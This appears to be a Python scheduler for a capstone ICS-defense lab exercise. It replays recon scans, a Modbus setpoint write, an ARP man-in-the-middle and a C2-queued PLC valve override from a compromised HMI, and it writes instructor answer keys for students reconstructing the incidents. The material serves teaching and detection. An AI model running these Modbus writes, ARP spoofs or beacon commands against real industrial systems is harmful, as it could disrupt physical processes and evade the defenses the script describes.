#!/usr/bin/env python3
"""Capstone "mystery attack" scheduler for the OT Defense course (Chapter 9).

Runs on Kali. Replays a hidden mix of the course-1 attacks the students
spent the afternoon building defenses against, so each student can treat
their own lab as an unknown incident and reconstruct it from their
defensive tooling alone (Wazuh, the router's Suricata / DNS / ARP logs,
and Zeek).

This adds no new attack capability. Every step just drives a primitive the
lab already ships and that the course already teaches students to detect:

  * a reconnaissance sweep           -> nmap (Chapters 3-4)
  * a blocked Modbus write from Kali -> setpoint_inject.py (Chapters 4-5)
  * an ARP man-in-the-middle         -> arpspoof (Chapter 6)
  * a Modbus write via the HMI beacon-> the C2 queue the beacon already
                                        polls (scadalts/cyber_injects/
                                        beacon_client.py), so the write
                                        leaves the HMI's own IP and only
                                        Zeek sees it (Chapters 5, 7)

The persistent HMI beacon's DNS check-ins run continuously from container
start (supervisord), independent of this script, so every scenario already
carries that trail; the scenarios below layer the episodic attacks on top.

Each scenario letter (A-D) is a FIXED structure so a Moodle quiz can be
keyed to it; only the timing jitter and a couple of register values vary.
Usage:

    mystery-attack A           # run scenario A against this lab
    mystery-attack A --fast    # no 1-3 min pre-delay, short gaps (dev/test)
    mystery-attack --dry-run B # print the plan and the answer key, do nothing
    mystery-attack restore     # undo process impact (manual mode off, stop arpspoof)
    mystery-attack --show-key C --dry-run   # reveal the instructor key

The attacks that change the process leave it changed only briefly: the
script disables manual mode again on exit (including Ctrl-C and errors), so
the plant recovers on its own while the evidence persists in the logs. Run
`mystery-attack restore` any time to force the process back to normal.

A per-run answer key (every action, with a UTC timestamp, the layer meant
to block it and the layer meant to detect it) is written to
/var/log/mystery-attack/ for the instructor's debrief.
"""
import argparse
import json
import os
import random
import signal
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone

# --- lab coordinates (match the rest of attacker/cyber_injects) --------------
HMI_IP = "192.168.90.107"
ROUTER_DMZ_IP = "192.168.90.200"
PLC_IP = "192.168.95.2"
CONTROL_SUBNET = "192.168.95.0/24"
C2_PENDING_FILE = "/tmp/c2_pending_command.json"
SETPOINT_INJECT = "/opt/cyber_injects/setpoint_inject.py"
KEY_DIR = "/var/log/mystery-attack"

# PLC register map (see plc/st_files/326339.st and control_daemon.py)
PURGE_MANUAL_SP = 12      # %QW holding register for the purge valve setpoint
MANUAL_MODE_COIL = 0      # %QX0.0 - forces ladder logic onto manual setpoints

_arpspoof = None          # running arpspoof subprocess, if any


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def log(msg):
    print(f"[mystery-attack] {now()}  {msg}", flush=True)


def dmz_interface():
    """Kali's DMZ NIC (the 192.168.90.x one). Defaults to eth1, the lab's
    usual name, but resolves it so a renamed interface still works."""
    try:
        out = subprocess.check_output(["ip", "-o", "-4", "addr", "show"], text=True)
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 4 and parts[3].startswith("192.168.90."):
                return parts[1]
    except Exception:
        pass
    return "eth1"


# --- attack primitives -------------------------------------------------------
# Each returns a short human string for the answer key. None of them raise;
# a failed step is logged and the scenario continues, because a half-blocked
# attack is itself a realistic thing for the defender to find.

def do_recon(fast=False):
    """Reverse-DNS sweep + a Modbus-port scan of the control network.

    -R forces the reverse (PTR) lookups even for hosts the firewall hides,
    so the DNS-log burst the students hunt for in Chapter 3 shows up whether
    or not segmentation is in place. The port scan's SYNs to 502 are what
    the firewall drops and a scan/connection Suricata rule alerts on.
    """
    iface = None
    results = []
    try:
        subprocess.run(
            ["nmap", "-sn", "-R", "--system-dns", CONTROL_SUBNET],
            timeout=90, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        results.append("reverse-DNS sweep of " + CONTROL_SUBNET)
    except Exception as exc:
        results.append(f"reverse-DNS sweep failed: {exc}")
    try:
        subprocess.run(
            ["nmap", "-Pn", "-n", "-p", "502,8080", PLC_IP],
            timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        results.append(f"port scan of {PLC_IP}:502,8080")
    except Exception as exc:
        results.append(f"port scan failed: {exc}")
    return "; ".join(results)


def do_blocked_write(fast=False):
    """A Modbus write aimed straight at the PLC from Kali's own IP.

    In the reference defensive config this is dropped by the Chapter 4
    firewall rule, so it never reaches the PLC - the point is that the
    *attempt* is loud (firewall-log drop, and the Chapter 5 connection rule)
    while changing nothing. setpoint_inject.py prints its own failure and
    exits cleanly when the connection is refused/filtered.
    """
    try:
        subprocess.run(
            ["python3", SETPOINT_INJECT,
             "--target-host", PLC_IP, "--setpoint-address", str(PURGE_MANUAL_SP),
             "--setpoint", "8000", "--enable"],
            timeout=30, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    return f"direct Modbus write attempt from Kali to {PLC_IP}:502 (expected blocked)"


def do_arp_mitm(fast=False):
    """Two-way ARP spoof: tell the HMI that Kali is the router and the
    router that Kali is the HMI. Left running briefly, then stopped so
    arpspoof re-advertises the correct MACs on its way out."""
    global _arpspoof
    iface = dmz_interface()
    try:
        _arpspoof = subprocess.Popen(
            ["arpspoof", "-i", iface, "-t", HMI_IP, "-r", ROUTER_DMZ_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        return "arpspoof not installed - MITM step skipped"
    except Exception as exc:
        return f"ARP spoof failed to start: {exc}"
    hold = 20 if fast else 75
    time.sleep(hold)
    stop_arp_mitm()
    return (f"two-way ARP spoof on {iface} ({HMI_IP} <-> {ROUTER_DMZ_IP}) "
            f"for {hold}s")


def stop_arp_mitm():
    global _arpspoof
    if _arpspoof and _arpspoof.poll() is None:
        _arpspoof.send_signal(signal.SIGTERM)
        try:
            _arpspoof.wait(timeout=5)
        except Exception:
            _arpspoof.kill()
    _arpspoof = None


def queue_c2(commands):
    with open(C2_PENDING_FILE, "w") as f:
        json.dump(commands, f)


def do_beacon_write(fast=False):
    """Queue a stuck-valve command for the HMI beacon to run on its next
    check-in. The write then leaves the HMI's own address, so the firewall
    allows it and an IP-allowlist Suricata rule skips it - only Zeek's
    mirror records it. Forces the purge valve to a fixed manual value, which
    pushes the process off its setpoint until manual mode is cleared."""
    queue_c2([
        {"action": "write_register", "address": PURGE_MANUAL_SP, "value": 6000},
        {"action": "write_coil", "address": MANUAL_MODE_COIL, "value": True},
    ])
    # beacon polls every ~5s; give it time to pick the command up
    time.sleep(8)
    return (f"stuck-valve write via the HMI beacon (purge valve -> manual, "
            f"from {HMI_IP})")


def restore_process():
    """Hand control back: clear manual mode through the beacon and stop any
    ARP spoof. Safe to call repeatedly."""
    stop_arp_mitm()
    queue_c2([{"action": "write_coil", "address": MANUAL_MODE_COIL, "value": False}])
    log("restore queued: manual mode off (beacon will apply within ~5s), "
        "arpspoof stopped")


# --- scenarios ---------------------------------------------------------------
# key fields describe the INTENDED defensive outcome for the instructor's
# debrief; they are not read back from the lab.

SCENARIOS = {
    "A": {
        "title": "Noisy outsider",
        "summary": "An attacker outside the control network scans it and tries "
                   "to command the PLC directly. Segmentation holds; nothing "
                   "reaches the process, but the attempts are loud.",
        "steps": [
            {"label": "Reconnaissance sweep", "run": do_recon,
             "source": "Kali 192.168.90.6",
             "blocked_by": "Firewall (control net unreachable from the DMZ)",
             "detected_by": "Router DNS page (reverse-lookup burst) and firewall "
                            "log; the Suricata connection rule also reaches "
                            "Wazuh (as level-3 alerts)",
             "impact": "None"},
            {"label": "Direct Modbus write to the PLC", "run": do_blocked_write,
             "source": "Kali 192.168.90.6",
             "blocked_by": "Firewall (only the HMI may reach PLC:502)",
             "detected_by": "Suricata connection-attempt rule; firewall-log drop",
             "impact": "None (blocked before it reached the PLC)"},
        ],
    },
    "B": {
        "title": "Quiet insider",
        "summary": "No scan, no blocked traffic. The already-compromised HMI "
                   "quietly commands the PLC from its own trusted address. "
                   "Only the passive sensor (Zeek) sees the write.",
        "steps": [
            {"label": "Stuck-valve write via the HMI beacon", "run": do_beacon_write,
             "source": "HMI 192.168.90.107 (compromised, via the beacon)",
             "blocked_by": "Nothing - the write carries the HMI's trusted IP",
             "detected_by": "Zeek only, and only with the mirror enabled "
                            "(Zeek rule: a Modbus write to the PLC from the "
                            "HMI's own IP). The firewall allows it and the "
                            "IP-allowlist Suricata rule skips it, so with the "
                            "Zeek mirror off this write is invisible to every "
                            "tool. The standing DNS beacon is the background clue.",
             "impact": "Purge valve forced to manual - the process drifts off "
                       "its setpoint until manual mode is cleared"},
        ],
    },
    "C": {
        "title": "Man in the middle",
        "summary": "The attacker first wedges between the HMI and the router, "
                   "then rides the compromised HMI to move the process. Two "
                   "layers each catch one half.",
        "steps": [
            {"label": "ARP man-in-the-middle", "run": do_arp_mitm,
             "source": "Kali 192.168.90.6",
             "blocked_by": "Nothing",
             "detected_by": "Router ARP page: the HMI's IP moves to a MAC that "
                            "also answers for Kali. (Reaches Wazuh only once "
                            "arpmon events are shipped to the SIEM.)",
             "impact": "None directly (attacker positioning)"},
            {"label": "Stuck-valve write via the HMI beacon", "run": do_beacon_write,
             "source": "HMI 192.168.90.107 (compromised, via the beacon)",
             "blocked_by": "Nothing - the write carries the HMI's trusted IP",
             "detected_by": "Zeek only, and only with the mirror enabled (a Modbus "
                            "write to the PLC from the HMI's own IP). Firewall "
                            "allows it; the IP-allowlist Suricata rule skips it.",
             "impact": "Purge valve forced to manual - the process drifts off "
                       "its setpoint until manual mode is cleared"},
        ],
    },
    "D": {
        "title": "Full chain",
        "summary": "Recon, then an ARP man-in-the-middle, then a write from the "
                   "compromised HMI. Three attacks, three different layers.",
        "steps": [
            {"label": "Reconnaissance sweep", "run": do_recon,
             "source": "Kali 192.168.90.6",
             "blocked_by": "Firewall (control net unreachable from the DMZ)",
             "detected_by": "Router DNS page (reverse-lookup burst) and firewall "
                            "log; the Suricata connection rule also reaches "
                            "Wazuh (as level-3 alerts)",
             "impact": "None"},
            {"label": "ARP man-in-the-middle", "run": do_arp_mitm,
             "source": "Kali 192.168.90.6",
             "blocked_by": "Nothing",
             "detected_by": "Router ARP page (reaches Wazuh only once arpmon "
                            "events are shipped to the SIEM)",
             "impact": "None directly (attacker positioning)"},
            {"label": "Stuck-valve write via the HMI beacon", "run": do_beacon_write,
             "source": "HMI 192.168.90.107 (compromised, via the beacon)",
             "blocked_by": "Nothing - the write carries the HMI's trusted IP",
             "detected_by": "Zeek only, and only with the mirror enabled (a Modbus "
                            "write to the PLC from the HMI's own IP). Firewall "
                            "allows it; the IP-allowlist Suricata rule skips it.",
             "impact": "Purge valve forced to manual - the process drifts off "
                       "its setpoint until manual mode is cleared"},
        ],
    },
}


def answer_key(letter, scenario, executed=None):
    key = {
        "scenario": letter,
        "title": scenario["title"],
        "summary": scenario["summary"],
        "generated": now(),
        "note": "Instructor key. Students reconstruct this from Wazuh "
                "(Suricata, Zeek and endpoint events) AND the router's own "
                "DNS and ARP pages - in the current lab the DNS burst and ARP "
                "events show only on the router, not in Wazuh. The beacon "
                "write is caught only if the Zeek mirror is enabled.",
        "steps": [],
    }
    for i, step in enumerate(scenario["steps"]):
        row = {
            "order": i + 1,
            "attack": step["label"],
            "source_host": step["source"],
            "blocked_by": step["blocked_by"],
            "detected_by": step["detected_by"],
            "process_impact": step["impact"],
        }
        if executed and i < len(executed):
            row["ran_at"] = executed[i]["ran_at"]
            row["result"] = executed[i]["result"]
        key["steps"].append(row)
    return key


def print_key(key):
    print(json.dumps(key, indent=2), flush=True)


def run_scenario(letter, fast=False):
    scenario = SCENARIOS[letter]
    log(f"scenario {letter} selected")

    pre = 0 if fast else random.randint(60, 180)
    if pre:
        log(f"lying low for {pre}s before the first action")
        time.sleep(pre)

    executed = []
    n = len(scenario["steps"])
    for i, step in enumerate(scenario["steps"]):
        ran_at = now()
        log(f"step {i+1}/{n}: {step['label']}")
        result = step["run"](fast=fast)
        log(f"           -> {result}")
        executed.append({"ran_at": ran_at, "result": result})
        if i < n - 1:
            gap = random.randint(10, 20) if fast else random.randint(90, 150)
            log(f"waiting {gap}s before the next action")
            time.sleep(gap)

    # Let the final process impact (if any) stand briefly so a watching
    # defender sees the live deviation, then hand control back. Evidence
    # stays in the logs regardless.
    settle = 5 if fast else 60
    log(f"holding for {settle}s, then restoring the process")
    time.sleep(settle)
    restore_process()

    key = answer_key(letter, scenario, executed)
    try:
        os.makedirs(KEY_DIR, exist_ok=True)
        path = os.path.join(
            KEY_DIR, f"{letter}-{datetime.now(timezone.utc):%Y%m%dT%H%M%SZ}.json")
        with open(path, "w") as f:
            json.dump(key, f, indent=2)
        log(f"scenario {letter} complete. Instructor key: {path}")
    except Exception as exc:
        log(f"scenario {letter} complete. (could not write key file: {exc})")
    return key


def main():
    parser = argparse.ArgumentParser(
        description="Capstone mystery-attack scheduler (OT Defense, Chapter 9).",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    parser.add_argument("scenario",
                        help="scenario letter A-D, or 'restore' to undo impact")
    parser.add_argument("--fast", action="store_true",
                        help="skip the pre-delay and shorten gaps (dev/testing)")
    parser.add_argument("--dry-run", action="store_true",
                        help="print the plan (and key) without attacking")
    parser.add_argument("--show-key", action="store_true",
                        help="print the instructor answer key to the terminal")
    args = parser.parse_args()

    choice = args.scenario.strip().upper()

    if choice == "RESTORE":
        restore_process()
        return

    if choice not in SCENARIOS:
        parser.error(f"unknown scenario {args.scenario!r}; choose one of "
                     f"{', '.join(sorted(SCENARIOS))}, or 'restore'")

    scenario = SCENARIOS[choice]

    if args.dry_run:
        log(f"DRY RUN - scenario {choice}: {scenario['title']}")
        log(scenario["summary"])
        for i, step in enumerate(scenario["steps"]):
            log(f"  step {i+1}: {step['label']}  [source: {step['source']}]")
        if args.show_key or args.dry_run:
            print_key(answer_key(choice, scenario))
        return

    # Always hand the process back, however we exit.
    def _bail(signum, frame):
        log(f"signal {signum} received - restoring and exiting")
        restore_process()
        sys.exit(130)
    signal.signal(signal.SIGINT, _bail)
    signal.signal(signal.SIGTERM, _bail)

    try:
        key = run_scenario(choice, fast=args.fast)
        if args.show_key:
            print_key(key)
    except Exception:
        restore_process()
        raise


if __name__ == "__main__":
    main()
